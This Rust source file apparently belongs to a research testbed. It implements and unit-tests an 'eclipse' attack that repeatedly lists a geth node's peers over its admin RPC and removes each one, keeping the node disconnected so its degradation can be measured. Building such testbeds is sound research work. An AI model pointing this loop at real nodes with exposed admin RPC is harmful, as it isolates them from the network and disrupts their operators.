//! Eclipse attack: keep a victim geth disconnected from its peers.
//!
//! Each round lists the victim's peers (`admin_peers`) and drops every one of
//! them (`admin_removePeer`, plus `admin_removeTrustedPeer` for a trusted
//! peer). geth re-dials through discovery, so the round is repeated on a short
//! interval to hold the peer set near zero for the whole phase. Nothing is
//! persisted: once the rounds stop, geth reconnects on its own.
//!
//! The victim's RPC stays reachable throughout, so the dataset captures the
//! degradation rather than a blackout: `peer_count` collapses, the head stops
//! advancing, finality distance grows.

use std::sync::Arc;
use std::time::Duration;

use futures_util::future::BoxFuture;
use serde::Deserialize;
use serde_json::{json, Value};
use tokio::sync::oneshot;

use crate::attacks::{Attack, AttackReport};
use crate::clients::geth_client::{GethClient, GethError};

/// Delay between two disconnection rounds.
const DEFAULT_ROUND_INTERVAL: Duration = Duration::from_millis(750);

/// One entry of the `admin_peers` answer. Only the fields used to target a
/// peer are kept; geth exposes the full `enode` directly.
#[derive(Debug, Clone, Deserialize)]
struct AdminPeer {
    #[serde(default)]
    enode: Option<String>,
    #[serde(default)]
    network: Option<AdminPeerNetwork>,
}

#[derive(Debug, Clone, Deserialize)]
struct AdminPeerNetwork {
    #[serde(default)]
    trusted: Option<bool>,
}

pub struct EclipseAttack {
    target: String,
    client: GethClient,
    round_interval: Duration,
}

impl EclipseAttack {
    /// An eclipse attack on the geth at `rpc_url`.
    pub fn new(
        target: impl Into<String>,
        rpc_url: &str,
        metrics_url: &str,
        request_timeout_secs: u64,
    ) -> Result<Self, GethError> {
        Ok(Self {
            target: target.into(),
            client: GethClient::new(rpc_url, metrics_url, request_timeout_secs)?,
            round_interval: DEFAULT_ROUND_INTERVAL,
        })
    }

    /// Overrides the delay between rounds (tests).
    pub fn with_round_interval(mut self, interval: Duration) -> Self {
        self.round_interval = interval;
        self
    }

    /// One disconnection round: drops every current peer. Returns
    /// `(removed, errors)`.
    async fn round(&self) -> (u64, u64) {
        let peers = match self.client.call::<Vec<AdminPeer>>("admin_peers", vec![]).await {
            Ok(result) => result.value,
            Err(error) => {
                tracing::warn!(
                    target = %self.target,
                    %error,
                    "eclipse: could not list the victim's peers this round"
                );
                return (0, 1);
            }
        };

        let mut removed = 0;
        let mut errors = 0;

        for peer in peers {
            let Some(enode) = peer.enode else {
                // Without an enode the peer cannot be targeted precisely.
                continue;
            };

            if self.remove(&enode, "admin_removePeer").await {
                removed += 1;
            } else {
                errors += 1;
            }

            if peer.network.and_then(|network| network.trusted).unwrap_or(false) {
                // A trusted peer is re-dialed unless it is also untrusted.
                let _ = self.remove(&enode, "admin_removeTrustedPeer").await;
            }
        }

        (removed, errors)
    }

    async fn remove(&self, enode: &str, method: &str) -> bool {
        self.client
            .call::<Value>(method, vec![json!(enode)])
            .await
            .is_ok()
    }
}

impl Attack for EclipseAttack {
    fn name(&self) -> &'static str {
        "eclipse"
    }

    fn target(&self) -> &str {
        &self.target
    }

    fn run(self: Arc<Self>, mut cancel: oneshot::Receiver<()>) -> BoxFuture<'static, AttackReport> {
        Box::pin(async move {
            let mut report = AttackReport::default();
            let mut ticker = tokio::time::interval(self.round_interval);
            ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

            loop {
                tokio::select! {
                    biased;
                    _ = &mut cancel => break,
                    _ = ticker.tick() => {
                        let (removed, errors) = self.round().await;
                        report.rounds += 1;
                        report.actions += removed;
                        report.errors += errors;
                    }
                }
            }

            tracing::info!(
                target = %self.target,
                rounds = report.rounds,
                peers_removed = report.actions,
                errors = report.errors,
                "eclipse: stopped; the victim will reconnect to its peers"
            );
            report
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc as StdArc;
    use wiremock::matchers::method;
    use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

    /// Replies to `admin_peers` with `peer_count` peers (each with an enode),
    /// and to `admin_removePeer` with `true`, counting the removals.
    struct GethMock {
        peer_count: usize,
        removals: StdArc<AtomicUsize>,
    }

    impl Respond for GethMock {
        fn respond(&self, request: &Request) -> ResponseTemplate {
            let body: Value = serde_json::from_slice(&request.body).unwrap();
            let method = body["method"].as_str().unwrap_or_default();

            let result = match method {
                "admin_peers" => Value::Array(
                    (0..self.peer_count)
                        .map(|i| json!({ "enode": format!("enode://{i:064x}@10.0.0.{i}:30303") }))
                        .collect(),
                ),
                "admin_removePeer" | "admin_removeTrustedPeer" => {
                    if method == "admin_removePeer" {
                        self.removals.fetch_add(1, Ordering::SeqCst);
                    }
                    json!(true)
                }
                _ => json!(null),
            };

            ResponseTemplate::new(200).set_body_json(json!({
                "jsonrpc": "2.0", "id": 1, "result": result,
            }))
        }
    }

    async fn mock_geth(peer_count: usize) -> (MockServer, StdArc<AtomicUsize>) {
        let server = MockServer::start().await;
        let removals = StdArc::new(AtomicUsize::new(0));
        Mock::given(method("POST"))
            .respond_with(GethMock {
                peer_count,
                removals: StdArc::clone(&removals),
            })
            .mount(&server)
            .await;
        (server, removals)
    }

    fn attack(uri: &str) -> EclipseAttack {
        EclipseAttack::new("node-01", uri, &format!("{uri}/metrics"), 3).unwrap()
    }

    #[tokio::test]
    async fn one_round_drops_every_listed_peer() {
        let (server, removals) = mock_geth(3).await;

        let (removed, errors) = attack(&server.uri()).round().await;

        assert_eq!(removed, 3);
        assert_eq!(errors, 0);
        assert_eq!(removals.load(Ordering::SeqCst), 3);
    }

    #[tokio::test]
    async fn a_node_with_no_peers_removes_nothing_without_error() {
        let (server, _) = mock_geth(0).await;

        assert_eq!(attack(&server.uri()).round().await, (0, 0));
    }

    #[tokio::test]
    async fn listing_failure_is_counted_not_fatal() {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .respond_with(ResponseTemplate::new(500))
            .mount(&server)
            .await;

        assert_eq!(attack(&server.uri()).round().await, (0, 1));
    }

    #[tokio::test]
    async fn the_target_is_reported() {
        let (server, _) = mock_geth(1).await;
        let attack = attack(&server.uri());

        assert_eq!(attack.name(), "eclipse");
        assert_eq!(attack.target(), "node-01");
    }

    // Real time (not paused): the attack makes real HTTP calls to the mock,
    // which a paused clock would not drive.
    #[tokio::test]
    async fn runs_rounds_until_cancelled_then_reports() {
        let (server, removals) = mock_geth(2).await;
        let attack = StdArc::new(attack(&server.uri()).with_round_interval(Duration::from_millis(40)));

        let (cancel_tx, cancel_rx) = oneshot::channel();
        let handle = tokio::spawn(StdArc::clone(&attack).run(cancel_rx));

        tokio::time::sleep(Duration::from_millis(220)).await;
        cancel_tx.send(()).unwrap();
        let report = handle.await.unwrap();

        assert!(report.rounds >= 2, "{report:?}");
        assert_eq!(report.actions, report.rounds * 2);
        assert_eq!(removals.load(Ordering::SeqCst) as u64, report.actions);
    }

    #[tokio::test]
    async fn cancelling_immediately_does_no_rounds() {
        let (server, _) = mock_geth(2).await;
        let attack = StdArc::new(attack(&server.uri()));

        let (cancel_tx, cancel_rx) = oneshot::channel();
        cancel_tx.send(()).unwrap();
        let report = attack.run(cancel_rx).await;

        assert_eq!(report.rounds, 0);
    }
}
